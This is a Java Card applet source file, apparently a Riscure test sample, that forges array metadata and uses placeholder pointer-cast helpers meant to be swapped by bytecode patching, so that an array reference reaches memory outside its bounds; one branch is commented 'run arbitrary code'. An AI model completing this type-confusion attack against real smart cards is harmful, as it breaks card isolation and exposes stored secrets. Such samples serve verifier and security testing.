/** Copyright 2016 Riscure */
package com.metadatamanipulation;

import javacard.framework.*;
import javacard.security.*;

/**
 * @aid 0xA0:0x00:0x00:0x00:0xAA:0x55:0x01
 * @version 1.0
 */
public class MetadataManipulation extends Applet {
  private static final byte INS_SUCCESS = 0x01;
  private static final byte INS_FAILURE = 0x02;

  byte[] success = {(byte) 0x01, (byte) 0x02, (byte) 0x01, (byte) 0x02};
  byte[] failure = {(byte) 0x80, (byte) 0x40, (byte) 0x80, (byte) 0x40};
  short msgLen = 4;
  protected static final byte CLA_APP = (byte) 0xA0; // CLASS byte for regular APDUs
  protected static final byte INS_PATCH = (byte) 0xB4; // INS to forge metadata
  byte[] mem = {(byte) 0x7F, (byte) 0xFF, (byte) 0x01, (byte) 0x00};
  byte[] file = mem;

  public static void install(byte[] bArray, short bOffset, byte bLength) {
    new MetadataManipulation(bArray, bOffset, bLength);
  }

  protected MetadataManipulation(byte[] bArray, short bOffset, byte bLength) {
    register();
  }

  public void process(APDU apdu) {
    short offset, length, offsetS, offsetD;
    byte[] buffer = apdu.getBuffer();
    if (selectingApplet()) return;
    if (buffer[ISO7816.OFFSET_CLA] != CLA_APP) ISOException.throwIt(ISO7816.SW_CLA_NOT_SUPPORTED);
    switch (buffer[ISO7816.OFFSET_INS]) {
      case INS_PATCH: // run arbitrary code
        // make file point to the beginning of the data part of mem, containing the artificial meta
        // data
        file = ptr((short) (addr(mem) + 4));
        Util.setShort(buffer, (short) 0, (short) file.length);
        apdu.setOutgoingAndSend((short) 0, (short) 2);
        break;
      case INS_SUCCESS:
        Util.arrayCopyNonAtomic(success, (short) 0, buffer, (short) 0, msgLen);
        apdu.setOutgoingAndSend((short) 0, (short) 4);
        break;
      case INS_FAILURE:
        Util.arrayCopyNonAtomic(failure, (short) 0, buffer, (short) 0, msgLen);
        apdu.setOutgoingAndSend((short) 0, (short) 4);
        break;
      default:
        ISOException.throwIt(ISO7816.SW_INS_NOT_SUPPORTED);
    }
  }

  public static short addr(byte[] ptr) {
    // return (short)ptr;
    return 0; // dummy statement
  }

  public static byte[] ptr(short addr) {
    // return (byte[])addr;
    return null; // dummy statement
  }

  public static short[] addr2(short[] ptr) {
    return ptr;
    // return 0; // dummy statement
  }

  public static byte ptr2(byte addr) {
    return addr;
    // return null; // dummy statement
  }
}
